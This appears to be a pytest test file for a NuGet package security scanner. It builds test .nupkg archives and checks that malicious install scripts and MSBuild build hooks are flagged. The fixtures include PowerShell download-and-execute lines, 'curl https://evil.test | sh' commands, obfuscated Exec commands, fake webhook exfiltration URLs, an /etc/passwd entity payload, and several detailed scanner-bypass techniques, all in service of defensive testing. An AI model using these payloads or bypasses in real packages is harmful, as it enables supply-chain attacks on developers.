import warnings
import zipfile
from pathlib import Path

import pytest

from buckthorn.cli import main
from buckthorn.findings import verdict
from buckthorn.scan import scan_artifact, split_artifact_name

NUSPEC = """<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">
  <metadata>
    <id>{id}</id>
    <version>{version}</version>
    <authors>someone</authors>
    <description>a package</description>
  </metadata>
</package>
"""


HOOK = f"https://discord.com/api/webhooks/{'1' * 18}/{'A' * 68}"
TELEGRAM = f"https://api.telegram.org/bot123456789:AA{'b' * 33}/sendMessage"


def _rules(findings):
    return sorted(f.rule_id for f in findings)


def _targets(body: str) -> str:
    return f'<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">{body}</Project>'


@pytest.fixture
def make_nupkg(tmp_path: Path):
    """Write a .nupkg: a zip with Pkg.nuspec at the top, as `nuget pack` makes.

    nuspec=None leaves the manifest out; raw gives its bytes. Other members are
    given by their full name, as a list so a name can appear twice.
    """

    def _make(
        files: dict[str, str | bytes] | list[tuple[str, str | bytes]] | None = None,
        id: str = "Pkg",
        version: str = "1.0.0",
        name: str = "Pkg.1.0.0.nupkg",
        nuspec: bool = True,
        raw: bytes | None = None,
    ) -> Path:
        members: list[tuple[str, str | bytes]] = []
        if raw is not None:
            members.append(("Pkg.nuspec", raw))
        elif nuspec:
            members.append(("Pkg.nuspec", NUSPEC.format(id=id, version=version)))
        members += list(files.items()) if isinstance(files, dict) else list(files or [])
        path = tmp_path / name
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")  # a duplicate name, on purpose
            with zipfile.ZipFile(path, "w") as zf:
                for member, data in members:
                    zf.writestr(member, data)
        return path

    return _make


# The manifest.


def test_nupkg_with_only_a_nuspec_is_clean(make_nupkg):
    assert scan_artifact(make_nupkg()) == []


def test_compiled_library_code_is_not_read_and_does_not_block_clean(make_nupkg):
    # lib/ runs only when the app calls it, like an npm bin file.
    files = {"lib/net8.0/Pkg.dll": b"MZ\x90\x00", "README.md": "hello"}
    assert scan_artifact(make_nupkg(files)) == []


def test_missing_nuspec_is_flagged_and_not_read(make_nupkg):
    findings = scan_artifact(make_nupkg(nuspec=False))
    assert _rules(findings) == ["BKT-NUGET-META-001", "BKT-SKIP-003"]
    assert verdict(findings) == "flagged"


@pytest.mark.parametrize(
    "raw",
    [
        b"<package><metadata>",  # does not parse
        b"\xff\xfe\x00",  # not text
        b"<package><metadata><version>1.0.0</version></metadata></package>",  # no id
        # An entity bomb: a DOCTYPE is refused before the XML is parsed.
        b'<!DOCTYPE p [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;">]><package>&b;</package>',
    ],
)
def test_unreadable_nuspec_is_flagged_and_not_read(make_nupkg, raw):
    findings = scan_artifact(make_nupkg(raw=raw))
    assert _rules(findings) == ["BKT-NUGET-META-001", "BKT-SKIP-003"]


def test_two_nuspecs_are_flagged(make_nupkg):
    # NuGet refuses a package with more than one: which one a tool reads is unknown.
    other = NUSPEC.format(id="Other", version="1.0.0")
    findings = scan_artifact(make_nupkg({"Other.nuspec": other}))
    assert _rules(findings) == ["BKT-NUGET-META-001", "BKT-SKIP-003"]


def test_nuspec_in_a_folder_is_not_the_manifest(make_nupkg):
    files = {"content/Other.nuspec": NUSPEC.format(id="Other", version="9.9.9")}
    assert scan_artifact(make_nupkg(files)) == []


@pytest.mark.parametrize(
    ("version", "name"),
    [
        ("1.0.0", "pkg.1.0.0.nupkg"),  # nuget.org's flat container names files in lower case
        ("1.0", "Pkg.1.0.0.nupkg"),  # nuget pack writes the normalized version
        ("1.0", "Pkg.1.0.nupkg"),
        ("1.0.0.0", "Pkg.1.0.0.nupkg"),
        ("01.2.3-Beta+build.5", "Pkg.1.2.3-Beta.nupkg"),  # build metadata is dropped
    ],
)
def test_file_name_matching_id_and_version_is_clean(make_nupkg, version, name):
    assert scan_artifact(make_nupkg(version=version, name=name)) == []


def test_file_name_not_matching_id_and_version_is_flagged(make_nupkg):
    findings = scan_artifact(make_nupkg(id="Other", name="Pkg.1.0.0.nupkg"))
    assert _rules(findings) == ["BKT-NUGET-META-001"]
    assert "Other 1.0.0" in findings[0].message


def test_channel_in_the_nuspec_is_flagged(make_nupkg):
    raw = NUSPEC.format(id="Pkg", version="1.0.0").replace("a package", HOOK)
    findings = scan_artifact(make_nupkg(raw=raw.encode()))
    assert _rules(findings) == ["BKT-EXFIL-001"]


# PowerShell that Visual Studio runs.


@pytest.mark.parametrize("member", ["tools/init.ps1", "Tools/Init.PS1", "tools/net45/init.ps1"])
def test_init_script_is_flagged(make_nupkg, member):
    findings = scan_artifact(make_nupkg({member: "param($installPath)\nWrite-Host hi\n"}))
    assert _rules(findings) == ["BKT-NUGET-SCRIPT-001"]
    assert findings[0].severity == "medium"
    assert findings[0].file_path == member


@pytest.mark.parametrize(
    "member",
    ["tools/install.ps1", "tools/uninstall.ps1", "Tools/Install.PS1", "tools/net45/install.ps1"],
)
def test_install_and_uninstall_scripts_are_a_note(make_nupkg, member):
    """Only packages.config projects in Visual Studio run them, and in the top
    1,000 packages they were all routine setup (eval/nuget-noise)."""
    findings = scan_artifact(make_nupkg({member: "param($installPath)\nWrite-Host hi\n"}))
    assert _rules(findings) == ["BKT-NUGET-SCRIPT-001"]
    assert findings[0].severity == "info"
    assert verdict(findings) == "clean"


@pytest.mark.parametrize("member", ["tools/helper.ps1", "content/install.ps1", "install.ps1"])
def test_powershell_that_does_not_run_on_its_own_is_not_flagged(make_nupkg, member):
    assert scan_artifact(make_nupkg({member: "Invoke-WebRequest https://x.test"})) == []


@pytest.mark.parametrize(
    "script",
    [
        "Invoke-WebRequest -Uri https://evil.test/a -OutFile a.exe",
        "(New-Object Net.WebClient).DownloadString('h'+'ttp://x') | iex",
        "$c = [System.Net.Http.HttpClient]::new()",
    ],
)
def test_powershell_script_that_fetches_is_high(make_nupkg, script):
    findings = scan_artifact(make_nupkg({"tools/install.ps1": script}))
    assert _rules(findings) == ["BKT-NUGET-INSTALL-001", "BKT-NUGET-SCRIPT-001"]


@pytest.mark.parametrize(
    "script",
    [
        "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2g=')))",
        "Invoke-Expression $s",
        "powershell -enc ZQBjAGgAbwA=",
        "powershell.exe -EncodedCommand ZQBjAGgAbwA=",
        "Start-Process $installPath\\tools\\run.exe",
        "Add-Type -TypeDefinition $code",
    ],
)
def test_install_script_that_runs_code_stays_medium(make_nupkg, script):
    findings = scan_artifact(make_nupkg({"tools/install.ps1": script}))
    assert _rules(findings) == ["BKT-NUGET-SCRIPT-001"]
    assert findings[0].severity == "medium"


def test_channel_in_a_script_is_flagged(make_nupkg):
    script = f"$u = '{TELEGRAM}'"
    findings = scan_artifact(make_nupkg({"tools/init.ps1": script}))
    assert "BKT-EXFIL-002" in _rules(findings)


def test_utf16_powershell_is_read(make_nupkg):
    script = "﻿Invoke-WebRequest https://evil.test".encode("utf-16-le")
    findings = scan_artifact(make_nupkg({"tools/install.ps1": script}))
    assert "BKT-NUGET-INSTALL-001" in _rules(findings)


# MSBuild files NuGet imports into every build.

EXEC = '<Target Name="T" BeforeTargets="Build"><Exec Command="echo hi" /></Target>'


@pytest.mark.parametrize(
    "member",
    [
        "build/Pkg.targets",
        "build/Pkg.props",
        "build/net8.0/Pkg.targets",
        "buildTransitive/Pkg.targets",
        "buildTransitive/net6.0/Pkg.props",
        "buildMultiTargeting/Pkg.targets",
        "Build/PKG.Targets",  # NuGet matches the id and folders in any case
        "build%2FPkg.targets",  # NuGet unescapes member names
        "build\\Pkg.targets",
    ],
)
def test_exec_in_an_imported_msbuild_file_is_flagged(make_nupkg, member):
    findings = scan_artifact(make_nupkg({member: _targets(EXEC)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001"]
    assert findings[0].severity == "medium"
    # On Windows, zipfile reads a \ in a member name as /.
    assert findings[0].file_path in (member, member.replace("\\", "/"))


@pytest.mark.parametrize(
    "member",
    ["build/Other.targets", "build/Pkg.xml", "content/Pkg.targets", "build/a/b/Pkg.targets"],
)
def test_msbuild_file_nothing_imports_by_name_is_a_note_if_it_runs_anything(make_nupkg, member):
    # A property built from other properties can still point a build at it, but
    # such a property in a file that is read is a gap already. .NET workload
    # manifests ship these by the dozen (eval/nuget-noise), so it is a note.
    findings = scan_artifact(make_nupkg({member: _targets(EXEC)}))
    assert [(f.rule_id, f.severity, f.file_path) for f in findings] == [
        ("BKT-NUGET-BUILD-004", "info", member)
    ]
    assert verdict(findings) == "clean"
    assert (
        scan_artifact(make_nupkg({member: _targets("<PropertyGroup><A>1</A></PropertyGroup>")}))
        == []
    )


def test_msbuild_file_with_nothing_that_runs_is_clean(make_nupkg):
    body = "<PropertyGroup><PkgHome>$(MSBuildThisFileDirectory)</PkgHome></PropertyGroup>"
    assert scan_artifact(make_nupkg({"build/Pkg.props": _targets(body)})) == []


def test_msbuild_without_a_namespace_and_in_any_case_is_read(make_nupkg):
    body = '<Project><target name="T"><exec command="curl https://evil.test" /></target></Project>'
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": body}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001", "BKT-NUGET-BUILD-002"]


@pytest.mark.parametrize(
    "body",
    [
        '<Target Name="T"><Exec Command="powershell iwr https://evil.test -OutFile a" /></Target>',
        '<Target Name="T"><DownloadFile SourceUrl="https://evil.test/a" '
        'DestinationFolder="obj" /></Target>',
    ],
)
def test_msbuild_that_fetches_is_high(make_nupkg, body):
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert "BKT-NUGET-BUILD-002" in _rules(findings)
    assert verdict(findings) == "flagged"


INLINE = """<UsingTask TaskName="Go" TaskFactory="RoslynCodeTaskFactory"
  AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.Core.dll">
  <Task><Code Type="Fragment" Language="cs"><![CDATA[{code}]]></Code></Task>
</UsingTask>"""


def test_inline_task_code_is_flagged(make_nupkg):
    body = INLINE.format(code='Log.LogMessage("hi");')
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-003"]


@pytest.mark.parametrize(
    "code",
    ["new System.Net.Http.HttpClient().GetStringAsync(u);", "new WebClient().DownloadFile(u, f);"]
    + ['var u = "https://evil.test/x";'],
)
def test_inline_task_code_that_fetches_is_high(make_nupkg, code):
    body = INLINE.format(code=code)
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-002", "BKT-NUGET-BUILD-003"]


def test_task_dll_the_package_ships_is_not_read(make_nupkg):
    body = '<UsingTask TaskName="Go" AssemblyFile="$(MSBuildThisFileDirectory)..\\tasks\\T.dll" />'
    files = {"build/Pkg.targets": _targets(body), "tasks/T.dll": b"MZ"}
    findings = scan_artifact(make_nupkg(files))
    assert _rules(findings) == ["BKT-SKIP-003"]
    assert findings[0].file_path == "build/Pkg.targets"
    assert verdict(findings) == "not_verified"


def test_task_from_msbuild_itself_is_not_a_gap(make_nupkg):
    body = (
        '<UsingTask TaskName="Zip" '
        'AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.Core.dll" />'
        '<UsingTask TaskName="Other" AssemblyName="Microsoft.Build.Tasks.Core" />'
    )
    assert scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)})) == []


def test_task_dll_named_at_build_time_is_not_read(make_nupkg):
    body = '<UsingTask TaskName="Go" AssemblyFile="$(TasksDir)T.dll" />'
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-SKIP-003"]


# Imports.


def test_package_file_an_imported_file_imports_is_read(make_nupkg):
    files = {
        "build/Pkg.targets": _targets(
            '<Import Project="$(MSBuildThisFileDirectory)..\\tools\\Real.targets" />'
        ),
        "tools/Real.targets": _targets(EXEC),
    }
    findings = scan_artifact(make_nupkg(files))
    assert [(f.rule_id, f.file_path) for f in findings] == [
        ("BKT-NUGET-BUILD-001", "tools/Real.targets")
    ]


def test_relative_import_is_from_the_importing_files_folder(make_nupkg):
    files = {
        "build/Pkg.targets": _targets('<Import Project="inner/Real.targets" />'),
        "build/inner/Real.targets": _targets(EXEC),
    }
    assert _rules(scan_artifact(make_nupkg(files))) == ["BKT-NUGET-BUILD-001"]


def test_wildcard_import_reads_every_match(make_nupkg):
    files = {
        "build/Pkg.targets": _targets(
            '<Import Project="$(MSBuildThisFileDirectory)parts/*.targets" />'
        ),
        "build/parts/a.targets": _targets(EXEC),
        "build/parts/b.targets": _targets(EXEC.replace("echo hi", "wget http://x")),
    }
    findings = scan_artifact(make_nupkg(files))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001", "BKT-NUGET-BUILD-001", "BKT-NUGET-BUILD-002"]


def test_imports_that_loop_are_read_once(make_nupkg):
    files = {
        "build/Pkg.targets": _targets('<Import Project="Pkg.props" />' + EXEC),
        "build/Pkg.props": _targets('<Import Project="Pkg.targets" />'),
    }
    assert _rules(scan_artifact(make_nupkg(files))) == ["BKT-NUGET-BUILD-001"]


@pytest.mark.parametrize(
    "project",
    [
        "$(MSBuildExtensionsPath)\\Microsoft\\x.targets",
        "$(MSBuildToolsPath)\\Microsoft.Common.targets",
    ],
)
def test_import_from_msbuild_itself_is_not_a_gap(make_nupkg, project):
    body = f'<Import Project="{project}" /><Import Sdk="Microsoft.NET.Sdk" Project="Sdk.props" />'
    assert scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)})) == []


@pytest.mark.parametrize("project", ["$(SomeDir)\\x.targets", "..\\..\\..\\other\\x.targets"])
def test_import_that_cannot_be_followed_is_a_gap(make_nupkg, project):
    body = f'<Import Project="{project}" />'
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-SKIP-003"]


def test_import_of_a_missing_package_file_is_a_gap(make_nupkg):
    body = '<Import Project="$(MSBuildThisFileDirectory)gone.targets" />'
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-SKIP-003"]


# MSBuild that cannot be read.


@pytest.mark.parametrize(
    "data",
    [
        "<Project><Target>",
        b"\xff\xff\xff",
        '<!DOCTYPE p [<!ENTITY e SYSTEM "file:///etc/passwd">]><Project>&e;</Project>',
        "<!doctype Project><Project/>",
    ],
)
def test_msbuild_file_that_cannot_be_read_is_a_gap(make_nupkg, data):
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": data}))
    assert _rules(findings) == ["BKT-SKIP-003"]
    assert verdict(findings) == "not_verified"


def test_utf16_msbuild_is_read(make_nupkg):
    data = ('<?xml version="1.0" encoding="utf-16"?>' + _targets(EXEC)).encode("utf-16")
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": data}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001"]


def test_every_copy_of_a_duplicated_member_is_read(make_nupkg):
    files = [("build/Pkg.targets", _targets("")), ("build/Pkg.targets", _targets(EXEC))]
    assert _rules(scan_artifact(make_nupkg(files))) == ["BKT-NUGET-BUILD-001"]


def test_channel_in_msbuild_is_flagged(make_nupkg):
    body = f"<PropertyGroup><U>{HOOK}</U></PropertyGroup>"
    findings = scan_artifact(make_nupkg({"build/Pkg.props": _targets(body)}))
    assert _rules(findings) == ["BKT-EXFIL-001"]


# Compiled code that runs in the compiler.


@pytest.mark.parametrize(
    "member", ["analyzers/dotnet/cs/Pkg.Generators.dll", "Analyzers/dotnet/Pkg.Analyzers.DLL"]
)
def test_analyzer_dll_is_not_read(make_nupkg, member):
    findings = scan_artifact(make_nupkg({member: b"MZ\x90\x00"}))
    assert _rules(findings) == ["BKT-SKIP-003"]
    assert findings[0].file_path == member
    assert verdict(findings) == "not_verified"


# The archive and the command line.


def test_nupkg_that_is_not_a_zip_is_a_gap(tmp_path):
    path = tmp_path / "Pkg.1.0.0.nupkg"
    path.write_bytes(b"not a zip")
    findings = scan_artifact(path)
    assert _rules(findings) == ["BKT-SKIP-001"]


@pytest.mark.parametrize(
    ("name", "expected"),
    [
        ("Pkg.1.0.0.nupkg", ("Pkg", "1.0.0")),
        ("Foo.Bar.2.1.0-beta.1.nupkg", ("Foo.Bar", "2.1.0-beta.1")),
        ("newtonsoft.json.13.0.3.nupkg", ("newtonsoft.json", "13.0.3")),
    ],
)
def test_nupkg_file_name_splits_into_id_and_version(name, expected):
    assert split_artifact_name(name) == expected


def test_cli_scans_a_nupkg_and_a_folder_of_them(make_nupkg, tmp_path, capsys):
    clean = make_nupkg()
    assert main(["scan", str(clean)]) == 0
    make_nupkg({"tools/init.ps1": "Write-Host hi"}, name="Bad.1.0.0.nupkg", id="Bad")
    assert main(["scan", str(tmp_path)]) == 1
    assert "BKT-NUGET-SCRIPT-001" in capsys.readouterr().out


# Review fixes.


def test_inline_task_code_from_a_file_is_read(make_nupkg):
    body = (
        '<UsingTask TaskName="Go" TaskFactory="RoslynCodeTaskFactory">'
        '<Task><Code Type="Class" Source="$(MSBuildThisFileDirectory)T.cs" /></Task></UsingTask>'
    )
    files = {"build/Pkg.targets": _targets(body), "build/T.cs": "new HttpClient();"}
    findings = scan_artifact(make_nupkg(files))
    assert _rules(findings) == ["BKT-NUGET-BUILD-002", "BKT-NUGET-BUILD-003"]


def test_inline_task_code_from_a_file_that_cannot_be_followed_is_a_gap(make_nupkg):
    body = (
        '<UsingTask TaskName="Go" TaskFactory="RoslynCodeTaskFactory">'
        '<Task><Code Type="Class" Source="$(Elsewhere)T.cs" /></Task></UsingTask>'
    )
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-003", "BKT-SKIP-003"]


def test_msbuild_escapes_are_decoded_before_reading(make_nupkg):
    body = '<Target Name="T"><Exec Command="c%75rl evil%2Etest/x" /></Target>'
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001", "BKT-NUGET-BUILD-002"]
    files = {
        "build/Pkg.targets": _targets(
            '<Import Project="%24(MSBuildThisFileDirectory)x.targets" />'
        ),
        "build/x.targets": _targets(EXEC),
    }
    assert _rules(scan_artifact(make_nupkg(files))) == ["BKT-NUGET-BUILD-001"]


def test_path_that_climbs_out_of_msbuilds_own_folder_is_a_gap(make_nupkg):
    body = '<UsingTask TaskName="Go" AssemblyFile="$(MSBuildToolsPath)\\..\\..\\..\\tmp\\x.dll" />'
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-SKIP-003"]


def test_lockfiles_still_take_only_python_and_npm_files():
    from buckthorn.scan import ARTIFACT_SUFFIXES, SCAN_SUFFIXES

    assert ".nupkg" not in ARTIFACT_SUFFIXES
    assert ".nupkg" in SCAN_SUFFIXES


# Security review fixes.


def test_project_the_msbuild_task_builds_is_read(make_nupkg):
    call = '<Target Name="X"><MSBuild Projects="$(MSBuildThisFileDirectory)../p.proj" /></Target>'
    files = {"build/Pkg.targets": _targets(call), "p.proj": _targets(EXEC)}
    findings = scan_artifact(make_nupkg(files))
    assert [(f.rule_id, f.file_path) for f in findings] == [("BKT-NUGET-BUILD-001", "p.proj")]


@pytest.mark.parametrize(
    ("projects", "rules"),
    [
        ("$(MSBuildProjectFullPath)", []),  # the user's own project again
        ("@(Others)", ["BKT-SKIP-003"]),
        ("$(MSBuildThisFileDirectory)a.proj;$(Elsewhere)b.proj", ["BKT-SKIP-003"]),
    ],
)
def test_projects_the_msbuild_task_builds_that_cannot_be_followed(make_nupkg, projects, rules):
    call = f'<Target Name="X"><MSBuild Projects="{projects}" /></Target>'
    files = {"build/Pkg.targets": _targets(call), "build/a.proj": _targets("")}
    assert _rules(scan_artifact(make_nupkg(files))) == rules


def test_old_build_cross_targeting_folder_is_read(make_nupkg):
    findings = scan_artifact(make_nupkg({"buildCrossTargeting/Pkg.targets": _targets(EXEC)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001"]


@pytest.mark.parametrize(
    ("project", "rules"),
    [
        ("$(MSBuildThisFileDirectory)x.targets", ["BKT-NUGET-BUILD-001"]),
        # Not followed (outside the package), and x.targets, imported by no name, is a note.
        ("..\\..\\..\\x.targets", ["BKT-NUGET-BUILD-004", "BKT-SKIP-003"]),
    ],
)
def test_sdk_import_that_names_a_package_file_is_followed(make_nupkg, project, rules):
    body = f'<Import Sdk="Microsoft.NET.Sdk" Project="{project}" />'
    files = {"build/Pkg.targets": _targets(body), "build/x.targets": _targets(EXEC)}
    assert _rules(scan_artifact(make_nupkg(files))) == rules


# Deeper bypass hunt: ways a package runs code at build and could scan clean.


@pytest.mark.parametrize("member", ["Sdk/Sdk.targets", "Sdk/Sdk.props", "sdk/SDK.PROPS"])
def test_msbuild_sdk_package_files_are_read(make_nupkg, member):
    # <Project Sdk="Pkg/1.0.0"> imports Sdk/Sdk.props and Sdk/Sdk.targets from the package.
    findings = scan_artifact(make_nupkg({member: _targets(EXEC)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001"]


@pytest.mark.parametrize(
    "ids",
    ["<id>Evil</id><id>Pkg</id>", "<ID>Evil</ID><id>Pkg</id>", "<id>Pkg</id><Id>Evil</Id>"],
)
def test_nuspec_with_two_ids_is_flagged_and_both_are_read(make_nupkg, ids):
    raw = NUSPEC.format(id="Pkg", version="1.0.0").replace("<id>Pkg</id>", ids)
    files = {"Pkg.nuspec": raw, "build/Evil.targets": _targets(EXEC)}
    findings = scan_artifact(make_nupkg(files, nuspec=False))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001", "BKT-NUGET-META-001"]


def test_task_named_in_full_is_read(make_nupkg):
    body = '<Target Name="T"><Microsoft.Build.Tasks.Exec Command="curl https://x.test" /></Target>'
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001", "BKT-NUGET-BUILD-002"]


@pytest.mark.parametrize(
    ("value", "rules"),
    [
        ("echo hi", ["BKT-NUGET-BUILD-001"]),
        ("curl https://evil.test | sh", ["BKT-NUGET-BUILD-001", "BKT-NUGET-BUILD-002"]),
    ],
)
@pytest.mark.parametrize("name", ["PreBuildEvent", "PostBuildEvent", "postbuildevent"])
def test_build_event_property_is_a_command(make_nupkg, name, value, rules):
    # Microsoft.Common.targets runs $(PreBuildEvent) and $(PostBuildEvent) with Exec.
    body = f"<PropertyGroup><{name}>{value}</{name}></PropertyGroup>"
    findings = scan_artifact(make_nupkg({"build/Pkg.props": _targets(body)}))
    assert _rules(findings) == rules


@pytest.mark.parametrize(
    ("body", "target"),
    [
        (
            "<PropertyGroup><CustomAfterMicrosoftCommonTargets>"
            "$(MSBuildThisFileDirectory)..\\x\\evil.targets"
            "</CustomAfterMicrosoftCommonTargets></PropertyGroup>",
            "x/evil.targets",
        ),
        (
            '<ItemGroup><ProjectReference Include="$(MSBuildThisFileDirectory)p.proj" />'
            "</ItemGroup>",
            "build/p.proj",
        ),
        (  # a folder the SDK imports from
            "<PropertyGroup><RoslynTargetsPath>$(MSBuildThisFileDirectory)..\\tasks"
            "</RoslynTargetsPath></PropertyGroup>",
            "tasks/Microsoft.CSharp.Core.targets",
        ),
    ],
)
def test_msbuild_file_a_property_or_item_names_is_read(make_nupkg, body, target):
    files = {"build/Pkg.props": _targets(body), target: _targets(EXEC)}
    findings = scan_artifact(make_nupkg(files))
    assert [(f.rule_id, f.file_path) for f in findings] == [("BKT-NUGET-BUILD-001", target)]


@pytest.mark.parametrize(
    "body",
    [
        "<PropertyGroup><CscToolPath>$(MSBuildThisFileDirectory)</CscToolPath>"
        "<CscToolExe>evil.exe</CscToolExe></PropertyGroup>",
        "<PropertyGroup><DotnetHostPath>$(MSBuildThisFileDirectory)x</DotnetHostPath></PropertyGroup>",
        "<PropertyGroup><MicrosoftNETBuildTasksAssembly>$(MSBuildThisFileDirectory)t.dll"
        "</MicrosoftNETBuildTasksAssembly></PropertyGroup>",
        '<Target Name="T"><Csc ToolExe="evil.exe" '
        'ToolPath="$(MSBuildThisFileDirectory)" /></Target>',
        '<ItemGroup><Analyzer Include="$(MSBuildThisFileDirectory)..\\lib\\x.dll" /></ItemGroup>',
    ],
)
def test_build_pointed_at_a_program_or_analyzer_is_not_read(make_nupkg, body):
    findings = scan_artifact(make_nupkg({"build/Pkg.props": _targets(body)}))
    assert set(_rules(findings)) == {"BKT-SKIP-003"}
    assert verdict(findings) == "not_verified"


def test_property_with_a_plain_value_is_not_followed(make_nupkg):
    body = "<PropertyGroup><Docs>readme.md</Docs><LangVersion>latest</LangVersion></PropertyGroup>"
    assert scan_artifact(make_nupkg({"build/Pkg.props": _targets(body)})) == []


def test_xml_is_read_in_the_encoding_it_declares(make_nupkg):
    # .NET Framework MSBuild honours encoding="utf-7": read as UTF-8, the markup hides.
    head = b'<?xml version="1.0" encoding="utf-7"?>'
    hidden = head + _targets(EXEC).encode("utf-7")
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": hidden}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001"]
    latin = '<?xml version="1.0" encoding="windows-1252"?>' + _targets(EXEC + "<!-- é -->")
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": latin.encode("cp1252")}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001"]


def test_xml_in_an_unknown_encoding_is_a_gap(make_nupkg):
    data = b'<?xml version="1.0" encoding="x-nope"?>' + _targets(EXEC).encode()
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": data}))
    assert _rules(findings) == ["BKT-SKIP-003"]


@pytest.mark.parametrize(
    "member",
    ["build/Pkg.targets.", "build/Pkg.targets ", "build./Pkg.targets", "build/Pkg.targets::$DATA"],
)
def test_names_windows_reads_as_another_file_are_read(make_nupkg, member):
    # Windows drops trailing dots and spaces, and ::$DATA is the file itself.
    findings = scan_artifact(make_nupkg({member: _targets(EXEC)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001"]


def test_command_built_from_a_property_is_searched_through_the_file(make_nupkg):
    body = (
        "<PropertyGroup><Cmd>curl https://evil.test</Cmd></PropertyGroup>"
        '<Target Name="T"><Exec Command="$(Cmd) | sh" /></Target>'
    )
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001", "BKT-NUGET-BUILD-002"]


@pytest.mark.parametrize("task", ["Error", "Warning", "Message", "Microsoft.Build.Tasks.Error"])
def test_a_link_a_build_only_shows_does_not_make_a_built_command_fetch(make_nupkg, task):
    # Microsoft.DotNet.ILCompiler: an Error points at https://aka.ms/... docs.
    body = (
        f'<Target Name="T"><{task} Text="see https://aka.ms/docs" />'
        '<Exec Command="&quot;$(CppLinker)&quot; @link.rsp" /></Target>'
    )
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001"]


@pytest.mark.parametrize(
    "group",
    [
        "<PropertyGroup><Message>curl https://evil.test</Message></PropertyGroup>",
        '<ItemGroup><Error Include="curl https://evil.test" /></ItemGroup>',
    ],
)
def test_a_property_or_item_named_like_a_shown_task_still_fetches(make_nupkg, group):
    body = group + '<Target Name="T"><Exec Command="$(Message) @(Error) | sh" /></Target>'
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001", "BKT-NUGET-BUILD-002"]


@pytest.mark.parametrize(
    ("trusted", "rules"),
    [("true", ["BKT-NUGET-BUILD-003"]), ("$(Trust)", ["BKT-NUGET-BUILD-003"]), ("false", [])],
)
def test_xslt_with_scripts_allowed_is_inline_code(make_nupkg, trusted, rules):
    body = (
        '<Target Name="T"><XslTransformation XslInputPath="a.xsl" XmlInputPaths="b.xml" '
        f'OutputPaths="c.xml" UseTrustedSettings="{trusted}" /></Target>'
    )
    assert _rules(scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))) == rules


def test_import_of_several_files_reads_each(make_nupkg):
    files = {
        "build/Pkg.targets": _targets('<Import Project="a.targets;b.targets" />'),
        "build/a.targets": _targets(EXEC),
        "build/b.targets": _targets(EXEC),
    }
    assert _rules(scan_artifact(make_nupkg(files))) == ["BKT-NUGET-BUILD-001"] * 2


# Second adversarial review.


@pytest.mark.parametrize("where", ["Pkg.nuspec", "build/Pkg.targets"])
def test_xml_naming_an_encoding_python_cannot_use_is_a_gap_not_a_crash(make_nupkg, where):
    data = b'<?xml version="1.0" encoding="undefined"?><Project />'
    if where == "Pkg.nuspec":
        findings = scan_artifact(make_nupkg(raw=data))
        assert _rules(findings) == ["BKT-NUGET-META-001", "BKT-SKIP-003"]
    else:
        assert _rules(scan_artifact(make_nupkg({where: data}))) == ["BKT-SKIP-003"]


@pytest.mark.parametrize(
    "body",
    [
        "<PropertyGroup><E>;..\\content\\evil.targets</E></PropertyGroup>"
        '<Import Project="$(MSBuildToolsPath)\\Microsoft.Common.tasks$(E)" />',
        "<PropertyGroup><MSBuildExtensionsPath>$(MSBuildThisFileDirectory)</MSBuildExtensionsPath>"
        "</PropertyGroup>"
        '<UsingTask TaskName="Go" AssemblyFile="$(MSBuildExtensionsPath)t.dll" />',
    ],
)
def test_msbuilds_own_folder_counts_only_when_the_rest_is_plain(make_nupkg, body):
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert "BKT-SKIP-003" in _rules(findings)


@pytest.mark.parametrize("attr", ["Properties", "AdditionalProperties"])
def test_properties_the_msbuild_task_sets_are_judged(make_nupkg, attr):
    body = (
        '<Target Name="X" BeforeTargets="CoreCompile">'
